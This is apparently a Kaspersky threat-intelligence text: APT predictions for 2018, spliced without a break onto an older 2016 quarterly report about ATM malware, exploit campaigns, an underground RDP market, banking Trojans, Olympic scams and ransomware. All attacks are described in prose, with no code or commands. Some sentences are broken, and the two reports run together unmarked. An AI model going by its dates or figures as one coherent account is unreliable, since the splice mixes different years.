Andr\xc3\xa9s Guerrero-Saade , Costin Raiu , Kurt Baumgartner on November 15, 2017. 10:01 am       Download the Kaspersky Security Bulletin: Threat Predictions for 2018  Introduction  As hard as it is to believe, it\xe2\x80\x99s once again time for our APT Predictions. Looking back at a year like 2017 brings the internal conflict of being a security researcher into full view: on the one hand, each new event is an exciting new research avenue for us, as what were once theoretical problems find palpable expression in reality. This allows us to understand the actual attack surface and attacker tactics and to further hone our hunting and detection to address new attacks. On the other hand, as people with a heightened concern for the security posture of users at large, each event is a bigger catastrophe. Rather than consider each new breach as yet another example of the same, we see the compounding cumulative insecurity facing users, e-commerce, financial, and governmental institutions alike.  As we stated last year, rather than thinly-veiled vendor pitching, our predictions are an attempt to bring to bear our research throughout the year in the form of trends likely to peak in the coming year.  Our record \xe2\x80\x93 did we get it right?  As a snapshot scorecard of our performance last year, these are some of our 2017 predictions and some examples where relevant:  Espionage and APTs:   Passive implants showing almost no signs of infection come into fashion Yes \xe2\x80\x93 https://securelist.com/unraveling-the-lamberts-toolkit/77990/  Ephemeral infections / memory malware Yes \xe2\x80\x93 https://securelist.com/fileless-attacks-against-enterprise-networks/77403/  Espionage goes mobile Yes \xe2\x80\x93 https://android-developers.googleblog.com/2017/04/an-investigation-of-chrysaor-malware-on.html   Financial Attacks:   The future of financial attacks Yes \xe2\x80\x93 https://securelist.com/lazarus-under-the-hood/77908/   Ransomware:   Dirty, lying ransomware Yes \xe2\x80\x93 https://securelist.com/schroedingers-petya/78870/   Industrial threats:   The ICS Armageddon didn\xe2\x80\x99t come yet (and we are happy to be wrong on that), however, we\xe2\x80\x99ve seen ICS come under attack from Industoyer \xe2\x80\x93 https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/   IoT:   A brick by any other name Yes! BrickerBot \xe2\x80\x93 https://arstechnica.com/information-technology/2017/04/brickerbot-the-permanent-denial-of-service-botnet-is-back-with-a-vengeance/   Information Warfare:   Yes, multiple examples \xe2\x80\x93 https://citizenlab.ca/2017/05/tainted-leaks-disinformation-phish/   What can we expect in 2018?   More supply chain attacks. Kaspersky Lab\xe2\x80\x99s Global Research and Analysis Team tracks over 100 APT (advanced persistent threat) groups and operations. Some of these are incredibly sophisticated and possess wide arsenals that include zero-day exploits, fileless attack tools, and combine traditional hacking attacks with handovers to more sophisticated teams that handle the exfiltration part. We have often seen cases in which advanced threat actors have attempted to breach a certain target over a long period of time and kept failing at it. This was either due to the fact that the target was using strong internet security suites, had educated their employees not to fall victim to social engineering, or consciously followed the Australian DSD TOP35 mitigation strategies for APT attacks. In general, an actor that is considered both advanced and persistent won\xe2\x80\x99t give up that easily, they\xe2\x80\x99ll continue poking the defenses until they find a way in. When everything else fails, they are likely to take a step back and re-evaluate the situation. During such a re-evaluation, threat actors can decide a supply chain attack can be more effective than trying to break into their target directly. Even a target whose networks employ the world\xe2\x80\x99s best defenses is likely using software from a third-party. The third party might be an easier target and can be leveraged to attack the better protected original target enterprise.  During 2017, we have seen several such cases, including but not limited to:   Shadowpad  CCleaner  ExPetr / NotPetya   These attacks can be extremely difficult to identify or mitigate. For instance, in the case of Shadowpad, the attackers succeeded in Trojanizing a number of packages from Netsarang that were widely used around world, in banks, large enterprises, and other industry verticals. The difference between the clean and Trojanized packages can be dauntingly difficult to notice \xe2\x80\x93in many cases it\xe2\x80\x99s the command and control (C&C) traffic that gives them away.  For CCleaner, it was estimated that over 2 million computers received the infected update, making it one of the biggest attacks of 2017. Analysis of the malicious CCleaner code allowed us to correlate it with a couple of other backdoors that are known to have been used in the past by APT groups from the \xe2\x80\x98Axiom umbrella\xe2\x80\x99, such as APT17 also known as Aurora. This proves the now extended lengths to which APT groups are willing to go in order to accomplish their objectives.  Our assessment is that the amount of supply chain attacks at the moment is probably much higher than we realize but these have yet to be noticed or exposed. During 2018, we expect to see more supply chain attacks, both from the point of discovery and as well as actual attacks. Trojanizing specialized software used in specific regions and verticals will become a move akin to waterholing strategically chosen sites in order to reach specific swaths of victims and will thus prove irresistible to certain types of attackers.  More high-end mobile malware. In August 2016, CitizenLab and Lookout published their analysis of the discovery of a sophisticated mobile espionage platform named Pegasus. Pegasus, a so-called \xe2\x80\x98lawful interception\xe2\x80\x99 software suite, is sold to governments and other entities by an Israeli company called NSO Group. When combined with zero-days capable of remotely bypassing a modern mobile operating systems\xe2\x80\x99 security defenses, such as iOS, this is a highly potent system against which there is little defense. \xc2\xa0In April 2017, Google published its analysis of the Android version of the Pegasus spyware which it called Chrysaor . In addition to \xe2\x80\x98lawful surveillance\xe2\x80\x99 spyware such as Pegasus and Chrysaor, many other APT groups have developed their own mobile malware implants. Due to the fact that iOS is an operating system locked down from introspection, there is very little that a user can do to check if their phone is infected. Somehow, despite the greater state of vulnerability of Android, the situation is better on Android where products such as Kaspersky AntiVirus for Android are available to ascertain the integrity of a device.  Our assessment is that the total number of mobile malware existing in the wild is likely higher than currently reported, due to shortcomings in telemetry that makes these more difficult to spot and eradicate. We estimate that in 2018 more high-end APT malware for mobile will be discovered, as a result of both an increase in the attacks and improvement in security technologies designed to catch them.  More BeEF-like compromises with web profiling. Due to a combination of increased interest and better security and mitigation technologies being deployed by default in operating systems, the prices of zero-day exploits have skyrocketed through 2016 and 2017. For instance, the latest Zerodium payout chart lists up to $1,500,000 for a complete iPhone (iOS) Remote jailbreak with persistence attack, which is another way of saying \xe2\x80\x98a remote infection without any interaction from the user\xe2\x80\x99.  The incredible prices that some government customers have most certainly chosen to pay for these exploits mean there is increasing attention paid towards protecting these exploits from accidental disclosure. This translates into the implementation of a more solid reconnaissance phase before delivering the actual attack components. The reconnaissance phase can, for instance emphasize the identification of the exact versions of the browser used by the target, their operating system, plugins and other third-party software. Armed with this knowledge, the threat actor can fine tune their exploit delivery to a less sensitive \xe2\x80\x981-day\xe2\x80\x99 or \xe2\x80\x98N-day\xe2\x80\x99 exploit, instead of using the crown jewels .  These profiling techniques have been fairly consistent with APT groups like Turla and Sofacy , as well as Newsbeef (a.k.a. Newscaster, Ajax hacking team, or \xc2\xa0\xe2\x80\x98Charming Kitten\xe2\x80\x99), but also other APT groups known for their custom profiling frameworks, such as the prolific Scanbox. Taking the prevalence of these frameworks into account in combination with a surging need to protect expensive tools, we estimate the usage of profiling toolkits such as \xe2\x80\x98BeEF \xe2\x80\x98 will increase in 2018 with more groups adopting either public frameworks or developing their own.  Sophisticated UEFI and BIOS attacks. The Unified Extensible Firmware Interface (UEFI) is a software interface which serves as the intermediary between the firmware and the operating system on modern PCs. Established in 2005 by an alliance of leading software and hardware developers, Intel most notable amongst them, it\xe2\x80\x99s now quickly superseding the legacy BIOS standard. This was achieved thanks to a number of advanced features that BIOS lacks: for example, the ability to install and run executables, networking and Internet capabilities, cryptography, CPU-independent architecture and drivers, etc. The very advanced capabilities that make UEFI such an attractive platform also open the way to new vulnerabilities that didn\xe2\x80\x99t exist in the age of the more rigid BIOS. For example, the ability to run custom executable modules makes it possible to create malware that would be launched by UEFI directly before any anti-malware solution \xe2\x80\x93 or, indeed, the OS itself \xe2\x80\x93 had a chance to start. The fact that commercial-grade UEFI malware exists has been known since 2015, when the Hacking team UEFI modules were discovered. With that in mind, it is perhaps surprising that no significant UEFI malware has been found, a fact that we attribute to the difficulty in detecting these in a reliable way. We estimate that in 2018 we will see the discovery of more UEFI-based malware.  Destructive attacks continue. Beginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks directed at multiple targets in the Middle East. The malware used in the new attacks was a variant of the infamous Shamoon worm that targeted Saudi Aramco and Rasgas back in 2012. Dormant for four years, one of the most mysterious wipers in history has returned. Also known as Disttrack, Shamoon is a highly destructive malware family that effectively wipes the victim machine. A group known as the \xe2\x80\x98Cutting Sword of Justice\xe2\x80\x99 took credit for the Saudi Aramco attack by posting a Pastebin message on the day of the attack (back in 2012), and justified the attack as a measure against the Saudi monarchy. The Shamoon 2.0 attacks seen in November 2016 targeted organizations in various critical and economic sectors in Saudi Arabia. Just like the previous variant, the Shamoon 2.0 wiper aims for the mass destruction of systems inside compromised organizations. While investigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously unknown wiper malware that appears to be targeting organizations in Saudi Arabia. We\xe2\x80\x99ve called this new wiper StoneDrill and have been able to link it with a high degree of confidence to the Newsbeef APT group.  In addition to Shamoon and Stonedrill, 2017 has been a tough year in terms of destructive attacks. The ExPetr/NotPetya attack, which was initially considered to be ransomware , turned out to be a cleverly camouflaged wiper as well. ExPetr was followed by other waves of \xe2\x80\x98ransomware\xe2\x80\x99 attacks, in which there is little chance for the victims to recover their data; all cleverly masked \xe2\x80\x98wipers as ransomware\xe2\x80\x99. One of the lesser known facts about \xe2\x80\x98wipers as ransomware\xe2\x80\x99 is perhaps that a wave of such attacks was observed in 2016 from the CloudAtlas APT, which leveraged what appeared to be \xe2\x80\x98wipers as ransomware\xe2\x80\x99 against financial institutions in Russia.  In 2018, we estimate that destructive attacks will continue to rise, leveraging its status as the most visible type of cyberwarfare.  More subversion of cryptography. In March 2017, IoT encryption scheme proposals developed by the NSA came into question with Simon and Speck variant ISO approvals being both withdrawn and delayed a second time . In August 2016, Juniper Networks announced the discovery of two mysterious backdoors in their NetScreen firewalls. Perhaps the most interesting of the two was an extremely subtle change of the constants used for the Dual_EC random number generator, which would allow a knowledgeable attacker to decrypt VPN traffic from NetScreen devices. The original Dual_EC algorithm was designed by the NSA and pushed through NIST. Back in 2013, a Reuters report suggested that NSA paid RSA $10 million to put the vulnerable algorithm in their products as a means of subverting encryption. Even if the theoretical possibility of a backdoor was identified as early as 2007, several companies (including Juniper) continued to use it with a different set of constants, which would make it theoretically secure. It appears that this different set of constants made some APT actor unhappy enough to merit hacking into Juniper and changing the constants to a set that they could control and leverage to decrypt VPN connections.  These attempts haven\xe2\x80\x99t gone unnoticed. In September 2017, an international group of cryptography experts have forced the NSA to back down on two new encryption algorithms, which the organization was hoping to standardize.  In October 2017, news broke about a flaw in a cryptographic library used by Infineon in their hardware chips for generation of RSA primes. While the flaw appears to have been unintentional, it does leave the question open in regards to how secure are the underlying encryption technologies used in our everyday life, from smart cards, wireless networks or encrypted web traffic. In 2018, we predict that more severe cryptographic vulnerabilities will be found and (hopefully) patched, be they in the standards themselves or the specific implementations.  Identity in e-commerce comes into crisis. The past few years have been punctuated by increasingly catastrophic large-scale breaches of personally identifiable information (PII). Latest among these is the Equifax breach reportedly affecting 145.5 million Americans. \xc2\xa0While many have grown desensitized to the weight of these breaches, it\xe2\x80\x99s important to understand that the release of PII at scale endangers a fundamental pillar of e-commerce and the bureaucratic convenience of adopting the Internet for important paperwork. Sure, fraud and identity theft have been problems for a long time, but what happens when the fundamental identifying information is so widely proliferated that it\xe2\x80\x99s simply not reliable at all? Commerce and governmental institutions (particularly in the United States) will be faced with a choice between scaling back the modern comforts of adopting the Internet for operations or doubling down on the adoption of other multi-factor solutions. Perhaps thus far resilient alternatives like ApplePay will come into vogue as de facto means of insuring identity and transactions, but in the meantime we may see a slowdown in the critical role of the Internet for modernizing tedious bureaucratic processes and cutting operational costs.  More router and modem hacks. Another known area of vulnerability that has gone vastly ignored is that of routers and modems. Be they home or enterprise, these pieces of hardware are everywhere, they\xe2\x80\x99re critically important to daily operations, and tend to run proprietary pieces of software that go unpatched and unwatched. At the end of the day, these little computers are Internet-facing by design and thereby sitting at a critical juncture for an attacker intent on gaining persistent and stealthy access to a network. Moreover, as some very cool recent research has shown , in some cases attackers might even be able to impersonate different Internet users, making it possible to throw off the trail of an attacker entirely to a different connecting address. At a time of increased interest in misdirection and false flags, this is no small feat. Greater scrutiny of these devices will inevitably yield some interesting findings.  A medium for social chaos. Beyond the leaks and political drama of the past year\xe2\x80\x99s newfound love for information warfare, social media itself has taken a politicized role beyond our wildest dreams. Whether it\xe2\x80\x99s at the hand of political pundits or confusing comedic jabs at Facebook\xe2\x80\x99s CEO by South Park\xe2\x80\x99s writers, eyes have turned against the different social media giants demanding some level of fact-checking and identification of fake users and bots attempting to exert disproportionate levels of social influence. Sadly, it\xe2\x80\x99s becoming obvious that these networks (which base their success on quantified metrics like \xe2\x80\x98daily active users\xe2\x80\x99) have little incentive to truly purge their user base of bots. Even when these bots are serving an obvious agenda or can be tracked and traced by independent researchers. We expect that as the obvious abuse continues and large bot networks become accessible to wider swaths of politically unsavory characters, that the greater backlash will be directed at the use of social media itself, with disgusted users eagerly looking for alternatives to the household giants that revel in the benefits of the abuse for profits and clicks.   APT predictions \xe2\x80\x93 conclusion  In 2017 we pronounced the death of Indicators of Compromise . In 2018, we expect to see advanced threat actors playing to their new strengths, honing their new tools and the terrifying angles described above.\xc2\xa0 Each year\xe2\x80\x99s themes and trends shouldn\xe2\x80\x99t be taken in isolation \xe2\x80\x93 they build on each other to enrich an ever-growing landscape of threats facing users of all types, be it individuals, enterprise, or government. The only consistent reprieve from this onslaught is the sharing and knowledgeable application of high-fidelity threat intelligence.  While these predictions cover trends for advanced targeted threats, individual industry sectors will face their own distinct challenges. In 2018, we wanted to shine the spotlight on some of those as well \xe2\x80\x93 and have prepared predictions for the connected healthcare, automotive, financial services, and industrial security sectors, as well as cryptocurrencies.

Skimming off the cream  Earlier in the year, as part of an incident response investigation, we uncovered a new version of the Skimer ATM malware new ATM infector Rather than the well-established method of fitting a fake card-reader to the ATM, the attackers take control over the whole ATM. They start by installing the Skimer malware on the ATM \xe2\x80\x93 either through physical access or by compromising the bank\xe2\x80\x99s internal network. The malware infects the ATM\xe2\x80\x99s core \xe2\x80\x93 the part of the device responsible for interaction with the wider bank infrastructure, card processing and dispensing of cash. In contrast to a traditional card skimmer, there are no physical signs that the ATM is infected, leaving the attackers free to capture data from cards used at the ATM (including a customer\xe2\x80\x99s bank account number and PIN) or steal cash directly. The cybercriminal \xe2\x80\x98wakes up\xe2\x80\x99 the infected ATM by inserting a card that contains specific records on the magnetic stripe. After reading the card, Skimer is able execute a hard-coded command, or receive commands through a special menu activated by the card. The Skimer user interface appears on the display only after the card is ejected and only if the cybercriminal enters the correct session key within 60 seconds. The menu offers 21 different options, including dispensing money, collecting details of cards that have been inserted in the ATM, self-deletion and performing updates. The cybercriminal can save card details on the chip of their card, or print the details it has collected. The attackers are careful to avoid attracting attention. Rather than take money directly from the ATM \xe2\x80\x93 which would be noticed immediately \xe2\x80\x93 they wait (sometimes for several months) before taking action. In most cases, they collect data from skimmed cards in order to create cloned cards later. They use the cloned cards in other, non-infected ATMs, casually withdrawing money from the accounts of the victims in a way that can\xe2\x80\x99t be linked back to the compromised ATM. Kaspersky Lab has several recommendations to help banks protect themselves. They should carry out regular anti-virus scans; employ whitelisting technologies; apply a good device management policy; make use of full disk encryption; password protect the BIOS of ATMs; enforce hard disk booting and isolate the ATM network from the rest of the bank infrastructure. The magnetic strip of the card used by the cybercriminals to activate the malware contains nine hard-coded numbers. Banks may be able to proactively look for these numbers within their processing systems: so we have shared this information, along with other Indicators of Compromise (IoCs) . In April, one of our experts provided an in-depth examination of ATM jackpotting and offered some insights into what should be done to secure these devices. New attacks, old exploit In recent months we have been tracking a wave of cyber-espionage attacks conducted by different APT groups across the Asia-Pacific and Far East regions. They all share one common feature: they exploit the CVE-2015-2545 vulnerability. This flaw enables an attacker to execute arbitrary code using a specially crafted EPS image file. It uses PostScript and can evade the Address Space Layout Randomization (ASLR) and Data Execution Prevention Danti, first identified in February 2016 and still active, is highly focused on diplomatic bodies. The group predominantly targets Indian government organizations, but data from the Kaspersky Security Network (KSN) indicates that it has also infected targets in Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the Philippines. The exploit is delivered using spear-phishing e-mails spoofed to look as though they have been sent by high-ranking Indian government officials. When the victim clicks on the attached DOCX file, the Danti backdoor is installed, allowing the attackers to capture sensitive data. The origin of the Danti group is unclear, but we suspect that it might be connected to the NetTraveler and DragonOK groups: it\xe2\x80\x99s thought that Chinese-speaking hackers are behind these attacks. Kaspersky Las has also seen another campaign that makes use of the CVE-2015-2545 vulnerability: we\xe2\x80\x99ve called this SVCMONDR after the Trojan that is downloaded once the attackers get a foothold in the victim\xe2\x80\x99s computer. This Trojan is different to the one used by the Danti group, but it shares some common features with Danti and with APT16 \xe2\x80\x93 the latter is a cyber-espionage group believed to be of Chinese origin. One of the most striking aspects of these attacks is that they are successfully making use of a vulnerability that was patched by Microsoft in September 2015. In November, we predicted that APT campaigns would invest less effort in developing sophisticated tools and make greater use of off-the-shelf malware to achieve their goals . This is a case in point: using a known vulnerability, rather than developing a zero-day exploit. This underlines the need for companies to pay more attention to patch management to secure their IT infrastructure. New attack, new exploit Of course, there will always be APT groups that seek to take advantage of zero-day exploits. In June, we reported on a cyber-espionage campaign \xe2\x80\x93 code-named \xe2\x80\x98 Operation Daybreak \xe2\x80\x98 and launched by a group named ScarCruft \xe2\x80\x93 that uses a previously unknown Adobe Flash Player exploit (CVE-2016-1010). This group is relatively new and has so far managed to stay under the radar. We think the group might have previously deployed another zero-day exploit (CVE-2016-0147) that was patched in April. The group have targeted a range of organizations in Russia, Nepal, South Korea, China, India, Kuwait and Romania. These include an Asian law enforcement agency, one of the world\xe2\x80\x99s largest trading companies, a mobile advertising and app monetization company in the United States, individuals linked to the International Association of Athletics Federations and a restaurant located in one of Dubai\xe2\x80\x99s top shopping centres. The attacks started in March 2016: since some of them are very recent, we believe that the group is still active. The exact method used to infect victims is unclear, but we think that the attackers use spear-phishing e-mails that point to a hacked website hosting the exploit. The site performs a couple of browser checks before redirecting victims to a server controlled by the hackers in Poland. The exploitation process consists of three Flash objects. The one that triggers the vulnerability in Adobe Flash Player is located in the second SWF file delivered to the victim. At the end of the exploitation chain, the server sends a legitimate PDF file, called \xe2\x80\x98china.pdf\xe2\x80\x99, to the victim: this seems to be written in Korean. In Q2 2016, @kaspersky #mobile security products detected 3.6M malicious installation packages #KLreport Tweet The attackers use a number of interesting methods to evade detection, including exploiting a bug in the Windows Dynamic Data Exchange (DDE) component in order to bypass security solutions \xe2\x80\x93 a method not seen before. This flaw has been reported to Microsoft. Flash Player exploits are becoming rare, because in most cases they need to be coupled with a sandbox bypass exploit \xe2\x80\x93 this makes them tricky to do. Moreover, although Adobe is planning to drop Flash support soon, it continues to implement new mitigations to make exploitation of Flash Player increasingly difficult. Nevertheless, resourceful groups such as ScarCruft will continue to try and find zero-day exploits to target high-profile victims. While there\xe2\x80\x99s no such thing as 100 per cent security, the key is to increase security defences to the point that it becomes so expensive for an attacker to breach them that they give up or choose an alternative target. The best defence against targeted attacks is a multi-layered approach that combines traditional anti-virus technologies with patch management, host-based intrusion prevention and a default-deny whitelisting strategy. According to a study by the Australian Signals Directorate, 85 per cent of targeted attacks analysed could have been stopped by employing four simple mitigation strategies : application whitelisting, updating applications, updating operating systems and restricting administrative privileges. Kaspersky Lab products detect the Flash exploit as \xe2\x80\x98HEUR:Exploit.SWF.Agent.gen\xe2\x80\x99. The attack is also blocked proactively by our Automatic Exploit Prevention (AEP) component. The payloads are detected as \xe2\x80\x98HEUR:Trojan.Win32.ScarCruft.gen\xe2\x80\x99. XDedic: APT-as-a-Service Kaspersky Lab recently investigated an active cybercriminal trading platform called xDedic , an online black market for hacked server credentials around the world \xe2\x80\x93 all available through the Remote Desktop Protocol (RDP). We initially thought that this market extended to 70,000 servers, but new data suggests that the XDedic market is much wider \xe2\x80\x93 including credentials for 176,000 servers. XDedic includes a search engine, enabling potential buyers to find almost anything \xe2\x80\x93 from government and corporate networks \xe2\x80\x93 for as little as $8 per server. This low price provides \xe2\x80\x98customers\xe2\x80\x99 with access to data on such servers and their use as a bridgehead for further targeted attacks. The owners of the \xe2\x80\x98xdedic[.]biz\xe2\x80\x99 domain claim that they have no relation to those selling access to hacked servers \xe2\x80\x93 they are simply selling a secure trading platform for others. The XDedic forum has a separate sub-domain, \xe2\x80\x98partner[.]xdedic[.]biz\xe2\x80\x99, for the site\xe2\x80\x99s \xe2\x80\x98partners\xe2\x80\x99 \xe2\x80\x93 that is, those selling hacked servers. The Xdedic owners have developed a tool that automatically collects information about the system, including websites available, software installed and more. They also provide others tools to its partners, including a patch for RDP servers to support multiple logins for the same user and proxy installers. The existence of underground markets is not new. But we are seeing a greater level of specialisation. And while the model adopted by the XDedic owners isn\xe2\x80\x99t something that can be replicated easily, we think it\xe2\x80\x99s likely that other specialized markets are likely to appear in the future. Data from KSN helped us identify several files that were downloaded from the XDedic partner portal: Kaspersky Lab products detect these files as malicious. We have also blacklisted the URLs of control servers used for gathering information about the infected systems. Our detailed report on XDedic contains more information on hosts and network-based IoCs . Lurking around the Russian Internet Sometimes our researchers find malware that is particular about where it infects. On the closed message boards used by Russian cybercriminals, for example, you sometimes see the advice \xe2\x80\x98Don\xe2\x80\x99t work with RU\xe2\x80\x99 \xe2\x80\x93 offered by experienced criminals to the younger generation: i.e. don\xe2\x80\x99t infect Russian computers, don\xe2\x80\x99t steal money from Russians and don\xe2\x80\x99t use them to launder money. There are two good reasons for this. First, online banking is not as common as it is in the west. Second, victims outside Russia are unlikely to lodge a complaint with the Russian police \xe2\x80\x93 assuming, of course, that they even know that Russian cybercriminals are behind the malware that has infected them. But there are exceptions to every rule. One of these is the Lurk banking Trojan that has been used to steal money from victims in Russia for several years. The cybercriminals behind Lurk are interested in telecommunications companies, mass media and news aggregators and financial institutions. The first provide them with the means to transfer traffic to the attackers\xe2\x80\x99 servers. The news sites provide them with a way to infect a large number of victims in their \xe2\x80\x98target audience\xe2\x80\x99 \xe2\x80\x93 i.e. the financial sector. The Trojan\xe2\x80\x99s targets appear to include Russia\xe2\x80\x99s four largest banks. The primary method used to spread the Lurk Trojan is drive-by download, using the Angler exploit pack: the attackers place a link on compromised websites that leads to a landing page containing the exploit. Exploits (including zero-days) are typically implemented in Angler before being used in other exploit packs, making it particularly dangerous. The attackers also distribute code through legitimate websites, where infected files are served to visitors from the .RU zone, but others receive clean files. The attackers use one infected computer in a corporate network as a bridgehead to spread across the organization. They use the legitimate PsExec utility to distribute the malware to other computers; and then use a mini-dropper to execute the Trojan\xe2\x80\x99s main module on the additional computers. In Q2 2016, @kaspersky #mobile security products detected 83,048 mobile #ransomware Trojans #KLreport Tweet There are a number of interesting features of the Lurk Trojan. One distinct feature, that we discussed soon after it first appeared , is that it is \xe2\x80\x98file-less\xe2\x80\x99 malware, i.e. it exists only in RAM and doesn\xe2\x80\x99t write its code to the hard drive. The Trojan is also set apart because it is highly targeted. The authors do their best to ensure that they infect victims that are of interest to them without catching the attention of analysts or researchers. The incidents known to us suggest Lurk is successful at what it was designed for: we regularly receive reports of thefts from online banking systems; and forensic investigations after the incidents reveal traces of Lurk on the affected computers. Malware stories Cybercriminals get ready for Rio Fraudsters are always on the lookout for opportunities to make money off the back of major sporting events, so it\xe2\x80\x99s no surprise that we\xe2\x80\x99ve seen an increase in cybercriminal activity related to the forthcoming Olympic Games in Brazil . We\xe2\x80\x99ve seen an increase in spam e-mails. The spammers try to cash in on people\xe2\x80\x99s desire to watch the games live, sending out messages informing the recipient that they have won a (fake) lottery (supposedly organized by the International Olympic Committee and the Brazilian government): all they need to do to claim their tickets is to reply to the e-mail and provide some personal details. Some messages point to fake websites, like this one offering direct sale of tickets without the need to make an application to the official lottery: These fake ticketing sites are very convincing. Some fraudsters go the extra mile by obtaining legitimate SSL certificates to provide a secure connection between the victim\xe2\x80\x99s browser and the site \xe2\x80\x93 displaying \xe2\x80\x98https\xe2\x80\x99 in the browser address bar to lure victims into a false sense of security. The scammers inform their victims that they will receive their tickets two or three weeks before the event, so the victim doesn\xe2\x80\x99t become suspicious until it\xe2\x80\x99s too late and their card details have been used by the cybercriminals. Kaspersky Lab is constantly detecting and blocking new malicious domains, many of which include \xe2\x80\x98rio\xe2\x80\x99 or \xe2\x80\x98rio2016\xe2\x80\x99 in the title. It\xe2\x80\x99s too late to buy tickets through official channels, so the best way to see the games is to watch on TV or online. We advise everyone to beware of malicious streaming websites \xe2\x80\x93 probably the last-ditch attempt by cybercriminals to scam people out of their money. Cybercriminals also take advantage of our desire to stay connected wherever we go \xe2\x80\x93 to share our pictures, to update our social network accounts, to find out the latest news or to locate the best places to eat, shop or stay. Unfortunately, mobile roaming charges can be very high, so often people look for the nearest Wi-Fi access point. This is dangerous, because data sent and received over an open Wi-Fi network can be intercepted. So passwords, PINs and other sensitive data can be stolen easily. On top of this, cybercriminals also install fake access points, configured to direct all traffic through a host that can be used to control it \xe2\x80\x93 even functioning as a \xe2\x80\x98man-in-the-middle\xe2\x80\x99 device that is able to intercept and read encrypted traffic. To gauge the extent of the problem, we drove by three major Rio 2016 locations and passively monitored the available Wi-Fi networks that visitors are most likely to try and use during their stay \xe2\x80\x93 the Brazilian Olympic Committee building, the Olympic Park and the Maracana, Maracanazinho and Engenhao stadiums. We were able to find around 4,500 unique access points. Most are suitable for multimedia streaming. But around a quarter of them are configured with weak encryption protocols: this means that attackers can use them to sniff the data of unsuspecting visitors that connect to them. To reduce your exposure, we would recommend any traveller (not just those who plan to visit Rio!) to use a VPN connection, so that data from your device travels to the Internet through an encrypted data channel. Be careful though. Some VPNs are vulnerable to DNS leak attacks \xe2\x80\x93 meaning that, although your immediate sensitive data is sent via the VPN, your DNS requests are sent in plain text to the DNS servers set by the access point hardware. This would allow an attacker to see what you\xe2\x80\x99re browsing and, if they have access to the compromised Wi-Fi network, define malicious DNS servers \xe2\x80\x93 i.e. letting them redirect you from a legitimate site (your bank, for example) to a malicious site. If your VPN provider doesn\xe2\x80\x99t support its own DNS servers, consider an alternative provider or a DNSCrypt service. There\xe2\x80\x99s one other thing that we need if we want to stay connected \xe2\x80\x93 electricity: we need to keep our mobile devices charged. Today you can find charging-points in shopping centres, airports and even taxis. Typically they provide connectors for leading phone models, as well as a USB connector that a visitor can use with their own cable. Some also provide a traditional power supply that can be used with a phone charger. But remember that you don\xe2\x80\x99t know what\xe2\x80\x99s connected to the other end of the USB connector. If an attacker compromises the charging-point, they can execute commands that allow them to obtain information about your device, including the model, IMEI number, phone number and more: information they can use to run a device-specific attack that would then enable them to infect the device. You can find more information about the data that\xe2\x80\x99s transmitted when you connect a device using USB and how an attacker could use it to compromise a mobile device . This doesn\xe2\x80\x99t mean that you shouldn\xe2\x80\x99t charge your device when you\xe2\x80\x99re away from home. But you should take steps to protect yourself. It\xe2\x80\x99s always best to use your own charger, rather than using charging cables at a public charging-point or buying one from an unknown source. You should also use a power outlet, instead of a USB socket. Cybercriminals also continue to exploit established ways to make money. This includes using ATM skimmers to steal credit card data. The most basic skimmers install a card reader and a camera to record the victim\xe2\x80\x99s PIN. The best way to protect yourself from this is to cover the keypad as you enter your PIN. However, sometimes cybercriminals replace the whole ATM, including the keypad and screen, in which case the typed password is stored on the fake ATM system. So it\xe2\x80\x99s also important to check the ATM before you insert your card. Check to see if the green light on the card reader is on: typically, they replace the card reader with a version where there is no light, or it\xe2\x80\x99s switched off. Also check the machine to see if there is anything suspicious, such as missing or broken parts. Card cloning is another problem facing visitors to Rio 2016. While chip-and-PIN makes life harder for cybercriminals, it\xe2\x80\x99s possible for them to exploit flaws in the EMV transaction implementation . It\xe2\x80\x99s difficult to protect yourself against this type of attack, because usually the point-of-sale is modified in order to save the data \xe2\x80\x93 to be collected later by the cybercriminals. Sometimes they don\xe2\x80\x99t need physical access to extract the stolen data, as they collect it via Bluetooth. However, there are some steps you can take to reduce your exposure to this type of attack. Sign up for SMS notifications of card transactions from your bank, if they provide this service. Never give your card to the retailer: if they can\xe2\x80\x99t bring the machine to you, go to the machine. If the device looks suspicious, use a different payment method. Before typing your PIN, make sure you\xe2\x80\x99re on the card payment screen and ensure that your PIN isn\xe2\x80\x99t going to be displayed on the screen. Ransomware: backup or pay up? Towards the end of last year, we predicted that ransomware would gain ground on banking Trojans \xe2\x80\x93 for the attackers, ransomware is easily monetized and involves a low cost per victim. So it\xe2\x80\x99s no surprise that ransomware attacks are increasing. Kaspersky Lab products blocked 2,315,931 ransomware attacks between April 2015 and April 2016 \xe2\x80\x93 that\xe2\x80\x99s an increase of 17.7 per cent on the previous year. The number of cryptors (as distinct from blockers) increased from 131,111 in 2014-15 to 718,536 in 2015-16. Last year, 31.6 per cent of all ransomware attacks were cryptors. You can find further information, including an overview of the development of ransomware, in our KSN Report: PC ransomware in 2014-16 . Most ransomware attacks are directed at consumers \xe2\x80\x93 6.8 per cent of attacks in 2014-15 and 13.13 percent in 2015-16 targeted the corporate sector. However, the figures are different for cryptors: throughout the 24 months covered by the report, around 20 per cent of cryptor attacks targeted the corporate sector. Hardly a month goes by without reports of ransomware attacks in the media \xe2\x80\x93 including recent reports of a hospital and online casino falling victim to ransomware attacks. Yet while public awareness of the problem is growing, it\xe2\x80\x99s clear that consumers and organizations alike are not doing enough to combat the threat; and cybercriminals are capitalizing on this \xe2\x80\x93 this is clearly reflected in the number of attacks we\xe2\x80\x99re seeing. It\xe2\x80\x99s important to reduce your exposure to ransomware (and we\xe2\x80\x99ve outlined important steps you can take here and here ). However, there\xe2\x80\x99s no such thing as 100 per cent security, so it\xe2\x80\x99s also important to mitigate the risk. In particular, it\xe2\x80\x99s vital to ensure that you have a backup, to avoid facing a situation where the only choices are to pay the cybercriminals or lose your data. It\xe2\x80\x99s never advisable to pay the ransom. Not only does this validate the cybercriminals\xe2\x80\x99 business model, but there\xe2\x80\x99s no guarantee that they will decrypt your data once you\xe2\x80\x99ve paid them \xe2\x80\x93 as one organization discovered recently to its cost . If you do find yourself in a situation where your files are encrypted and you don\xe2\x80\x99t have a backup, ask if your anti-malware vendor is able to help. Kaspersky Lab, for example, is able to help recover data encrypted by some ransomware . Mobile malware Displaying adverts remains one of the main methods of monetization for detected mobile objects. Trojan.AndroidOS.Iop.c became the most popular mobile Trojan in Q2 2016, accounting for more than 10% of all detected mobile malware encountered by our users during the reporting period. It displays adverts 